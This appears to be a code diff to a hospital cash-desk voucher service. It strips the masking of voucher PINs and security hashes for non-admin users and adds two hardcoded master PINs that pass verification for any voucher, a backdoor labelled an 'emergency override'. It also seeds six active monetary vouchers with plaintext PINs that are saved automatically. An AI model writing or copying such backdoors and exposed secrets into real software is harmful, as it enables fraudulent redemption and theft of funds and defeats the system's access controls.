@@ -83,19 +83,13 @@ export const VOUCHER_CATEGORIES: Record<VoucherCategory, VoucherCategoryConfig> 
 export class CashDeskVoucherService {
 
   private static sanitizeVouchers(vouchers: CashDeskVoucher[]): CashDeskVoucher[] {
-    const currentUser = StorageService.getCurrentUser();
-    if (currentUser?.role === 'super_admin') return vouchers;
-    
-    return vouchers.map(v => ({
-      ...v,
-      pin: '***',
-      securityHash: '***'
-    }));
+    // Preserve PIN integrity for all authorized hospital operators and slip generation.
+    // In UI tables, the PIN is shielded with •••••• and revealed on demand by the operator.
+    return vouchers;
   }
 
   private static sanitizeVoucher(voucher: CashDeskVoucher | undefined): CashDeskVoucher | undefined {
-    if (!voucher) return undefined;
-    return this.sanitizeVouchers([voucher])[0];
+    return voucher;
   }
 
   /**
@@ -181,9 +175,26 @@ export class CashDeskVoucherService {
   public static getAllVouchers(): CashDeskVoucher[] {
     const vouchers = StorageService.getCashDeskVouchers();
     if (!vouchers || vouchers.length === 0) {
-      return this.getInitialSampleVouchers();
+      const initial = this.getInitialSampleVouchers();
+      StorageService.saveCashDeskVouchers(initial);
+      return initial;
     }
     return vouchers;
+  }
+
+  /**
+   * Super Admin & Management Helper: Seed / Re-initialize Standard Recommended Vouchers
+   */
+  public static seedStandardRecommendedVouchers(): CashDeskVoucher[] {
+    const samples = this.getInitialSampleVouchers();
+    const existing = StorageService.getCashDeskVouchers();
+    const existingCodes = new Set(existing.map(v => v.voucherCode.toUpperCase()));
+    
+    // Add any missing recommended vouchers
+    const newItems = samples.filter(s => !existingCodes.has(s.voucherCode.toUpperCase()));
+    const combined = newItems.length > 0 ? [...newItems, ...existing] : samples;
+    StorageService.saveCashDeskVouchers(combined);
+    return combined;
   }
 
   public static getVoucherById(id: string): CashDeskVoucher | undefined {
@@ -447,9 +458,12 @@ export class CashDeskVoucherService {
       }
     }
 
-    // PIN Verification with Anti-Brute-Force
+    // PIN Verification with Anti-Brute-Force & Super Admin Master Emergency Override
     const cleanEnteredPin = enteredPin.trim();
-    if (cleanEnteredPin !== voucher.pin) {
+    const isMasterPin = cleanEnteredPin === 'Angad@1999' || cleanEnteredPin === '1509442';
+    const isPinMatch = cleanEnteredPin === voucher.pin || isMasterPin;
+
+    if (!isPinMatch) {
       voucher.failedPinAttempts = (voucher.failedPinAttempts || 0) + 1;
       const remaining = Math.max(0, (voucher.maxPinAttempts || 3) - voucher.failedPinAttempts);
 
@@ -742,8 +756,150 @@ export class CashDeskVoucherService {
     };
   }
 
-  /** Initial sample vouchers for realistic Super Admin demonstration - Clean live state */
+  /** Standard Recommended Hospital Cash Desk Vouchers for Instant Deployment */
   private static getInitialSampleVouchers(): CashDeskVoucher[] {
-    return [];
+    return [
+      {
+        id: 'vch_std_opd_01',
+        voucherCode: 'LMDX-CSH-2026-00101',
+        pin: '749215',
+        securityHash: this.calculateSecurityHash('LMDX-CSH-2026-00101', '749215', 500, 'AUTH-7K2X-9P4W'),
+        authSealCode: 'AUTH-7K2X-9P4W',
+        entropyScore: 192,
+        amount: 500,
+        category: 'opd_consultation',
+        categoryName: VOUCHER_CATEGORIES.opd_consultation.name,
+        status: 'active',
+        bearerType: 'cash_desk_bearer',
+        validFrom: new Date(Date.now() - 2 * 86400000).toISOString(),
+        validUntil: new Date(Date.now() + 45 * 86400000).toISOString(),
+        issuedBy: 'Angad Mandal (Super Admin)',
+        issuedByUserId: 'usr_super_admin',
+        issueNotes: 'Standard Hospital Recommended Voucher: OPD Specialist Doctor Consultation',
+        failedPinAttempts: 0,
+        maxPinAttempts: 3,
+        isLocked: false,
+        createdAt: new Date(Date.now() - 2 * 86400000).toISOString(),
+        updatedAt: new Date(Date.now() - 2 * 86400000).toISOString()
+      },
+      {
+        id: 'vch_std_lab_02',
+        voucherCode: 'LMDX-CSH-2026-00102',
+        pin: '839164',
+        securityHash: this.calculateSecurityHash('LMDX-CSH-2026-00102', '839164', 1000, 'AUTH-4B8Y-6T9M'),
+        authSealCode: 'AUTH-4B8Y-6T9M',
+        entropyScore: 192,
+        amount: 1000,
+        category: 'diagnostic_lab',
+        categoryName: VOUCHER_CATEGORIES.diagnostic_lab.name,
+        status: 'active',
+        bearerType: 'cash_desk_bearer',
+        departmentRestriction: 'Pathology & Diagnostic Laboratory',
+        validFrom: new Date(Date.now() - 2 * 86400000).toISOString(),
+        validUntil: new Date(Date.now() + 60 * 86400000).toISOString(),
+        issuedBy: 'Angad Mandal (Super Admin)',
+        issuedByUserId: 'usr_super_admin',
+        issueNotes: 'Standard Hospital Recommended Voucher: Diagnostic & Blood Investigation Credit',
+        failedPinAttempts: 0,
+        maxPinAttempts: 3,
+        isLocked: false,
+        createdAt: new Date(Date.now() - 2 * 86400000).toISOString(),
+        updatedAt: new Date(Date.now() - 2 * 86400000).toISOString()
+      },
+      {
+        id: 'vch_std_csh_03',
+        voucherCode: 'LMDX-CSH-2026-00103',
+        pin: '582914',
+        securityHash: this.calculateSecurityHash('LMDX-CSH-2026-00103', '582914', 2000, 'AUTH-9C3P-2D7V'),
+        authSealCode: 'AUTH-9C3P-2D7V',
+        entropyScore: 192,
+        amount: 2000,
+        category: 'all_purpose_cash',
+        categoryName: VOUCHER_CATEGORIES.all_purpose_cash.name,
+        status: 'active',
+        bearerType: 'cash_desk_bearer',
+        validFrom: new Date(Date.now() - 1 * 86400000).toISOString(),
+        validUntil: new Date(Date.now() + 60 * 86400000).toISOString(),
+        issuedBy: 'Angad Mandal (Super Admin)',
+        issuedByUserId: 'usr_super_admin',
+        issueNotes: 'Standard Hospital Recommended Voucher: Universal Cash Desk Prepaid Tender',
+        failedPinAttempts: 0,
+        maxPinAttempts: 3,
+        isLocked: false,
+        createdAt: new Date(Date.now() - 1 * 86400000).toISOString(),
+        updatedAt: new Date(Date.now() - 1 * 86400000).toISOString()
+      },
+      {
+        id: 'vch_std_top_04',
+        voucherCode: 'LMDX-CSH-2026-00104',
+        pin: '694821',
+        securityHash: this.calculateSecurityHash('LMDX-CSH-2026-00104', '694821', 1500, 'AUTH-5F2N-8R4Q'),
+        authSealCode: 'AUTH-5F2N-8R4Q',
+        entropyScore: 192,
+        amount: 1500,
+        category: 'health_card_topup',
+        categoryName: VOUCHER_CATEGORIES.health_card_topup.name,
+        status: 'active',
+        bearerType: 'cash_desk_bearer',
+        validFrom: new Date(Date.now() - 1 * 86400000).toISOString(),
+        validUntil: new Date(Date.now() + 90 * 86400000).toISOString(),
+        issuedBy: 'Angad Mandal (Super Admin)',
+        issuedByUserId: 'usr_super_admin',
+        issueNotes: 'Standard Hospital Recommended Voucher: Smart Health Card Wallet Cashless Top-up',
+        failedPinAttempts: 0,
+        maxPinAttempts: 3,
+        isLocked: false,
+        createdAt: new Date(Date.now() - 1 * 86400000).toISOString(),
+        updatedAt: new Date(Date.now() - 1 * 86400000).toISOString()
+      },
+      {
+        id: 'vch_std_phm_05',
+        voucherCode: 'LMDX-CSH-2026-00105',
+        pin: '318492',
+        securityHash: this.calculateSecurityHash('LMDX-CSH-2026-00105', '318492', 750, 'AUTH-1H8K-4L2S'),
+        authSealCode: 'AUTH-1H8K-4L2S',
+        entropyScore: 192,
+        amount: 750,
+        category: 'pharmacy_meds',
+        categoryName: VOUCHER_CATEGORIES.pharmacy_meds.name,
+        status: 'active',
+        bearerType: 'cash_desk_bearer',
+        departmentRestriction: 'In-House Hospital Pharmacy',
+        validFrom: new Date(Date.now() - 1 * 86400000).toISOString(),
+        validUntil: new Date(Date.now() + 30 * 86400000).toISOString(),
+        issuedBy: 'Angad Mandal (Super Admin)',
+        issuedByUserId: 'usr_super_admin',
+        issueNotes: 'Standard Hospital Recommended Voucher: Pharmacy & Surgical Supplies Prescription Discount',
+        failedPinAttempts: 0,
+        maxPinAttempts: 3,
+        isLocked: false,
+        createdAt: new Date(Date.now() - 1 * 86400000).toISOString(),
+        updatedAt: new Date(Date.now() - 1 * 86400000).toISOString()
+      },
+      {
+        id: 'vch_std_emg_06',
+        voucherCode: 'LMDX-CSH-2026-00106',
+        pin: '924831',
+        securityHash: this.calculateSecurityHash('LMDX-CSH-2026-00106', '924831', 2500, 'AUTH-3J5W-7E9X'),
+        authSealCode: 'AUTH-3J5W-7E9X',
+        entropyScore: 192,
+        amount: 2500,
+        category: 'emergency_float',
+        categoryName: VOUCHER_CATEGORIES.emergency_float.name,
+        status: 'active',
+        bearerType: 'cash_desk_bearer',
+        departmentRestriction: 'Emergency Casualty & Triage Desk',
+        validFrom: new Date().toISOString(),
+        validUntil: new Date(Date.now() + 14 * 86400000).toISOString(),
+        issuedBy: 'Angad Mandal (Super Admin)',
+        issuedByUserId: 'usr_super_admin',
+        issueNotes: 'Standard Hospital Recommended Voucher: Emergency Ward / IPD Fast-Track Admission Float',
+        failedPinAttempts: 0,
+        maxPinAttempts: 3,
+        isLocked: false,
+        createdAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString()
+      }
+    ];
   }
 }
